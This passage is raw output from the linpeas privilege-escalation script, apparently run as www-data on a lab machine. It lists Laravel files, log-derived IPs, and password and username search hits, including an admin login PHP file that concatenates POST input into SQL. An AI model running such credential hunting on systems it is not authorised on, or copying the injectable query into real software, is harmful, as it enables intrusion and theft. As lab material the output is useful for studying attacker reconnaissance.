DoctrineTest/InstantiatorTest/Exception/UnexpectedValueExceptionTest.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/InstantiatorTest.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/AbstractClassAsset.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/ArrayObjectAsset.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/ExceptionAsset.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/FinalExceptionAsset.php\r/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/PharAsset.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/erusev\r/var/www/laravel/vendor/erusev/parsedown\r/var/www/laravel/vendor/erusev/parsedown/.travis.yml\r/var/www/laravel/vendor/erusev/parsedown/LICENSE.txt\r/var/www/laravel/vendor/erusev/parsedown/Parsedown.php\r/var/www/laravel/vendor/erusev/parsedown/README.md\r/var/www/laravel/vendor/erusev/parsedown/composer.json\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/erusev/parsedown/test/CommonMarkTest.php\r/var/www/laravel/vendor/erusev/parsedown/test/ParsedownTest.php\r/var/www/laravel/vendor/erusev/parsedown/test/TestParsedown.php\r/var/www/laravel/vendor/erusev/parsedown/test/bootstrap.php\r/var/www/laravel/vendor/erusev/parsedown/test/data\r/var/www/laravel/vendor/erusev/parsedown/test/data/aesthetic_table.html\r/var/www/laravel/vendor/erusev/parsedown/test/data/aesthetic_table.md\r/var/www/laravel/vendor/erusev/parsedown/test/data/aligned_table.html\r/var/www/laravel/vendor/erusev/parsedown/test/data/aligned_table.md\r/var/www/laravel/vendor/erusev/parsedown/test/data/atx_heading.html\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto\r/var/www/laravel/vendor/fzaninotto/faker\r/var/www/laravel/vendor/fzaninotto/faker/.gitignore\r/var/www/laravel/vendor/fzaninotto/faker/.travis.yml\r/var/www/laravel/vendor/fzaninotto/faker/CHANGELOG.md\r/var/www/laravel/vendor/fzaninotto/faker/CONTRIBUTING.md\r/var/www/laravel/vendor/fzaninotto/faker/LICENSE\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator/Iban.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator/Luhn.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Documentor.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Factory.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Generator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Guesser\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Guesser/Name.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/ColumnTypeGuesser.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/EntityPopulator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/Populator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/ColumnTypeGuesser.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/EntityPopulator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/Populator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/ColumnTypeGuesser.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/EntityPopulator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/Populator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/ColumnTypeGuesser.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/EntityPopulator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/Populator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/ColumnTypeGuesser.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/EntityPopulator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/Populator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/ColumnTypeGuesser.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/EntityPopulator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/Populator.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Barcode.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Base.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Biased.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Color.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Text.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Text.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/at_AT\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/at_AT/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/PhoneNumber.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/PhoneNumber.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Utils.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/DateTime.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Payment.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Person.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Person.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Person.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Person.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Company.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/PhoneNumber.php\r#)You_can_write_even_more_files_inside_last_directory\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU/PhoneNumber.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_CA\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_CA/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_CA/PhoneNumber.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Payment.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/PhoneNumber.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/Address.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/Internet.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/Person.php\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/PhoneNumber.php\r[+] Interesting GROUP writable files (not in Home) (max 500)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group www-data: /var/www/html/linpeas.sh /var/www/html/1.txt\r/var/www/html/index.html\r[+] Searching passwords in config PHP files\r[+] Checking for TTY (sudo/su) passwords in audit logs\r[+] Finding IPs inside logs (limit 70)\r14 /var/log/dpkg.log.1:1.16.04.3 11 /var/log/dpkg.log.1:1.16.04.1\r7 /var/log/wtmp.1:192.168.150.100\r4 /var/log/installer/status:1.2.3.3\r1 /var/log/wtmp.1:10.10.14.141\r1 /var/log/lastlog:10.10.14.141\r1 /var/log/installer/status:2.21.63.3\r[+] Finding passwords inside logs (limit 70)\r/var/log/bootstrap.log: base-passwd depends on libc6 (\u0026gt;= 2.8); however: /var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (\u0026gt;= 0.145); however:\r/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...\r/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...\r/var/log/bootstrap.log:Selecting previously unselected package base-passwd.\r/var/log/bootstrap.log:Selecting previously unselected package passwd.\r/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...\r/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...\r/var/log/bootstrap.log:Shadow passwords are now on.\r/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...\r/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...\r/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...\r/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:\r/var/log/dpkg.log.1:2017-02-15 20:19:39 configure base-passwd:amd64 3.5.39 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:39 install base-passwd:amd64 \u0026lt;none\u0026gt; 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:39 status half-configured base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:39 status half-installed base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:39 status installed base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:39 status unpacked base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:43 status half-configured base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:43 status half-installed base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:43 status unpacked base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:43 upgrade base-passwd:amd64 3.5.39 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:19:56 install passwd:amd64 \u0026lt;none\u0026gt; 1:4.2-3.1ubuntu5\r/var/log/dpkg.log.1:2017-02-15 20:19:56 status half-installed passwd:amd64 1:4.2-3.1ubuntu5\r/var/log/dpkg.log.1:2017-02-15 20:19:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5\r/var/log/dpkg.log.1:2017-02-15 20:20:12 configure base-passwd:amd64 3.5.39 \u0026lt;none\u0026gt;\r/var/log/dpkg.log.1:2017-02-15 20:20:12 status half-configured base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:20:12 status unpacked base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:20:13 status installed base-passwd:amd64 3.5.39\r/var/log/dpkg.log.1:2017-02-15 20:20:26 configure passwd:amd64 1:4.2-3.1ubuntu5 \u0026lt;none\u0026gt;\r/var/log/dpkg.log.1:2017-02-15 20:20:26 status half-configured passwd:amd64 1:4.2-3.1ubuntu5\r/var/log/dpkg.log.1:2017-02-15 20:20:26 status installed passwd:amd64 1:4.2-3.1ubuntu5\r/var/log/dpkg.log.1:2017-02-15 20:20:26 status unpacked passwd:amd64 1:4.2-3.1ubuntu5\r/var/log/installer/status:Description: Set up users and passwords\r[+] Finding emails inside logs (limit 70)\r58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com 28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com\r17 /var/log/installer/status:kernel-team@lists.ubuntu.com\r4 /var/log/bootstrap.log:ftpmaster@ubuntu.com\r[+] Finding *password* or *credential* files in home (limit 70)\r[+] Finding passwords inside key folders (limit 70) - only PHP files\r/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php: \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;required|string|min:6|confirmed\u0026#39;, /var/www/laravel/app/Http/Controllers/Auth/RegisterController.php: \u0026#39;password\u0026#39; =\u0026gt; bcrypt($data[\u0026#39;password\u0026#39;]), /var/www/laravel/bootstrap/cache/services.php: \u0026#39;Illuminate\\Auth\\Passwords\\PasswordResetServiceProvider\u0026#39; =\u0026gt; /var/www/laravel/bootstrap/cache/services.php: \u0026#39;auth.password\u0026#39; =\u0026gt; \u0026#39;Illuminate\\Auth\\Passwords\\PasswordResetServiceProvider\u0026#39;,\r/var/www/laravel/bootstrap/cache/services.php: \u0026#39;auth.password.broker\u0026#39; =\u0026gt; \u0026#39;Illuminate\\Auth\\Passwords\\PasswordResetServiceProvider\u0026#39;,\r/var/www/laravel/database/factories/ModelFactory.php: \u0026#39;password\u0026#39; =\u0026gt; $password ?: $password = bcrypt(\u0026#39;secret\u0026#39;),\r/var/www/laravel/resources/lang/en/passwords.php: \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;Passwords must be at least six characters and match the confirmation.\u0026#39;,\r./linpeas.sh: 3147: printf: %r: invalid directive\rsh: printf: I/O error\r[+] Finding passwords inside key folders (limit 70) - no PHP files\r/var/www/laravel/CHANGELOG.md:- Remove index from password reset `token` column ([#4180](https://github.com/laravel/laravel/pull/4180))\r./linpeas.sh: 3151: printf: %r: invalid directive\rsh: printf: I/O error\r[+] Finding possible password variables inside key folders (limit 140)\r/var/www/laravel/.env:APP_NAME=Laravel /var/www/laravel/.env:DB_CONNECTION=mysql\r/var/www/laravel/.env:DB_DATABASE=homestead\r/var/www/laravel/.env:DB_HOST=127.0.0.1\r/var/www/laravel/.env:DB_PORT=3306\r/var/www/laravel/.env:DB_USERNAME=homestead\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php: $this-\u0026gt;secretKey = $secretKey;\r/var/www/laravel/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php: \u0026#39;app_name\u0026#39; =\u0026gt; $this-\u0026gt;name,\r/var/www/laravel/.env:APP_NAME=Laravel\r/var/www/laravel/.env:DB_CONNECTION=mysql\r/var/www/laravel/.env:DB_DATABASE=homestead\r/var/www/laravel/.env:DB_HOST=127.0.0.1\r/var/www/laravel/.env:DB_PORT=3306\r/var/www/laravel/.env:DB_USERNAME=homestead\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php: $this-\u0026gt;secretKey = $secretKey;\r/var/www/laravel/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php: \u0026#39;app_name\u0026#39; =\u0026gt; $this-\u0026gt;name,\r[+] Finding possible password in config files\r/etc/debconf.conf passwords.\rpassword\rpasswords.\rpasswords\rpassword\rpasswords.dat\rpasswords and one for everything else.\rpasswords\rpassword is really\rPasswd: secret\r/etc/init/passwd.conf\rpasswd - clear locks on passwd and related files\rpasswd to avoid million duplicate bug reports\rpasswd locks\u0026#34;\rpasswd.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock\r/etc/nsswitch.conf\rpasswd: compat\r/etc/adduser.conf\rpasswd\r/etc/apache2/apache2.conf\rpasswd files from being\r/etc/sysctl.d/10-ptrace.conf\rcredentials that exist in memory (re-using existing SSH connections,\r[+] Finding \u0026#39;username\u0026#39; string inside key folders (limit 70)\r/var/www/admin/index.php: \u0026lt;label\u0026gt;UserName :\u0026lt;/label\u0026gt;\u0026lt;input type = \u0026#34;text\u0026#34; name = \u0026#34;username\u0026#34; class = \u0026#34;box\u0026#34;/\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\r/var/www/admin/index.php: $myusername = $_POST[\u0026#39;username\u0026#39;];\r/var/www/admin/index.php: $sql = \u0026#34;SELECT id FROM users WHERE username = \u0026#39;\u0026#34;.$myusername.\u0026#34;\u0026#39; and password = \u0026#39;\u0026#34;.$mypassword.\u0026#34;\u0026#39;\u0026#34;;\r/var/www/admin/session.php: $ses_sql = mysqli_query($db,\u0026#34;select username from admin where username = \u0026#39;$user_check\u0026#39; \u0026#34;);\r/var/www/laravel/.env:DB_USERNAME=homestead\r/var/www/laravel/.env:MAIL_USERNAME=null\r/var/www/laravel/config/database.php: \u0026#39;username\u0026#39; =\u0026gt; env(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;forge\u0026#39;),\r/var/www/laravel/config/mail.php: \u0026#39;username\u0026#39; =\u0026gt; env(\u0026#39;MAIL_USERNAME\u0026#39;),\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php: $username = static::bothify($this-\u0026gt;generator-\u0026gt;parse($format)); /var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php: protected static $userNameFormats = array(\r/var/www/laravel/vendor/fzaninotto/faker/test/Faker/Provider/InternetTest.php: $username = $this-\u0026gt;faker-\u0026gt;username();\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php: list($username, $password) = $credentials;\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php: list($username, $password) = [\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/README.md: \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, /var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ThrottlesLogins.php: $errors = [$this-\u0026gt;username() =\u0026gt; $message];\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php: $this-\u0026gt;username = $username;\r/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php: public function from($username, $icon = null)\r/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php: $username = $this-\u0026gt;safeStorage-\u0026gt;retrieveSafely(\u0026#39;username\u0026#39;);\r/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php: return $username !== null ? $username : \u0026#39;anonymous\u0026#39;;\r/var/www/laravel/vendor/league/flysystem/src/Adapter/Ftp.php: ) . \u0026#39;, username: \u0026#39; . $this-\u0026gt;getUsername()\r/var/www/laravel/vendor/monolog/monolog/doc/01-usage.md:$logger-\u0026gt;addInfo(\u0026#39;Adding a new user\u0026#39;, array(\u0026#39;username\u0026#39; =\u0026gt; \u0026#39;Seldaek\u0026#39;));\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/CouchDBHandler.php: \u0026#39;username\u0026#39; =\u0026gt; null,\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php: $dataArray[\u0026#39;username\u0026#39;] = $this-\u0026gt;username;\r/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/Slack/SlackRecord.php: $this-\u0026gt;username = $username;\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Slack/SlackRecordTest.php: $username = \u0026#39;Monolog bot\u0026#39;;\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackHandlerTest.php: $this-\u0026gt;assertRegExp(\u0026#39;/username=Monolog/\u0026#39;, $content);\r/var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/SlackWebhookHandlerTest.php: \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;test-username\u0026#39;,\r/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php: \u0026#39;getUsername\u0026#39; =\u0026gt; array(\r/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php: \u0026#39;getUsername\u0026#39; =\u0026gt; array($methodProphecy)\r/var/www/laravel/vendor/phpspec/prophecy/spec/Prophecy/Prophecy/ObjectProphecySpec.php: \u0026#39;isUsername\u0026#39; =\u0026gt; array(\r/var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst: \u0026#39;{username}\u0026#39;=\u0026gt;$row[\u0026#39;username\u0026#39;], /var/www/laravel/vendor/swiftmailer/swiftmailer/doc/plugins.rst: \u0026#39;{username}\u0026#39;=\u0026gt;$user[\u0026#39;username\u0026#39;], /var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Plugins/PopBeforeSmtpPlugin.php: $this-\u0026gt;_username = $username;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/Esmtp/AuthHandler.php: $this-\u0026gt;_username = $username;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#34;DOMAIN\\user\u0026#34;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#34;domain.com\\user\u0026#34;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;test\u0026#39;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;user\u0026#39;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;user@DOMAIN\u0026#39;;\r/var/www/laravel/vendor/swiftmailer/swiftmailer/tests/unit/Swift/Transport/Esmtp/Auth/NTLMAuthenticatorTest.php: $username = \u0026#39;user@domain.com\u0026#39;;\r/var/www/laravel/vendor/symfony/http-foundation/Session/Storage/Handler/PdoSessionHandler.php: private $username = \u0026#39;\u0026#39;;\r/var/www/laravel/vendor/symfony/http-foundation/Tests/RequestTest.php: $request = Request::create(\u0026#39;http://username:password@test.com\u0026#39;);\r/var/www/laravel/vendor/symfony/http-foundation/Tests/ServerBagTest.php: \u0026#39;AUTHORIZATION\u0026#39; =\u0026gt; \u0026#39;Basic \u0026#39;.base64_encode(\u0026#39;username:pass:word\u0026#39;),\r/var/www/admin/index.php: \u0026lt;label\u0026gt;UserName :\u0026lt;/label\u0026gt;\u0026lt;input type = \u0026#34;text\u0026#34; name = \u0026#34;username\u0026#34; class = \u0026#34;box\u0026#34;/\u0026gt;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;\r/var/www/admin/index.php: $myusername = $_POST[\u0026#39;username\u0026#39;];\r/var/www/admin/index.php: $sql = \u0026#34;SELECT id FROM users WHERE username = \u0026#39;\u0026#34;.$myusername.\u0026#34;\u0026#39; and password = \u0026#39;\u0026#34;.$mypassword.\u0026#34;\u0026#39;\u0026#34;;\r/var/www/admin/session.php: $ses_sql = mysqli_query($db,\u0026#34;select username from admin where username = \u0026#39;$user_check\u0026#39; \u0026#34;);\r/var/www/laravel/.env:DB_USERNAME=homestead\r/var/www/laravel/.env:MAIL_USERNAME=null\r/var/www/laravel/config/database.php: \u0026#39;username\u0026#39; =\u0026gt; env(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;forge\u0026#39;),\r/var/www/laravel/config/mail.php: \u0026#39;username\u0026#39; =\u0026gt; env(\u0026#39;MAIL_USERNAME\u0026#39;),\r/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php: $username = 